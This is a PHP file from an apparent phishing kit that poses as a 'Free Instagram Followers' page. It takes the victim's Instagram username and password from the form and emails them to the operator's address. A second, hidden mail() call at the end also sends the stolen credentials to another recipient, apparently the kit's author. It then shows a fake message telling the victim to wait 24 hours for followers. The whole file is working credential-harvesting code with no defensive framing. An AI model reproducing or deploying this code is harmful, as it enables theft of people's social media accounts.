<?php
$username = $_POST['username'];
$password = $_POST['password'];
$followers = $_POST['followers'];
?>

<?php
include('email_result.php');
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$subjek = "INSTAGRAM | PUNYA SI $username";
$body = <<<EOD
<div style='font-family: Tahoma;line-height: 25px;color: #333;font-size: 14px;border: 1px solid #FF3366;	padding: 20px; margin-top: 20px;'>
Username         =  $username<br>
Password      =  $password<br>
Followers      =  $followers<br>
<hr style='border: 0;border-bottom: 1px solid #FF3366;background: #999;'/>
Coming from   = $url<br>
</div>
EOD;
//* jangan di ubah kalo kagak mau error!,gak usah sok tau deh //*
$headers = "From: RAFLIPEDIA <result@raflipedia.ml>\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($result, $subjek, $body, $headers);
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='img/mod.png' rel='icon' type='image/x-png'/>
<title>Free Instagram Followers</title>
<script src="js/jquery.min.js"></script>
<link rel="stylesheet" href="css/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(img/background.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>
<div style="border: 1px pink solid; padding: 10px; background-color:pink; text-align: left"><center><font size="5"><font color="white">Instagram Followers</font></font></center> </div>
<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

</div>
<div class="col-md-8">
</br>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:white;width:100%" class="form-horizontal">
<form action="index.php" method="POST">
<center><font size="4">Your account has been proccesed.</font></center>
<center><font size="5">Please wait 24 hours to get your followers.</font></center>
</br>
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color:pink;" id="gsubmit" value="Logout"> </form>

  




  




<?php
//* Mengirim Informasi AREANA Jangan Dihapus, Jangan Sok Tau deh //*
$success = mail($auth0, $subjek, $body, $headers);
?>
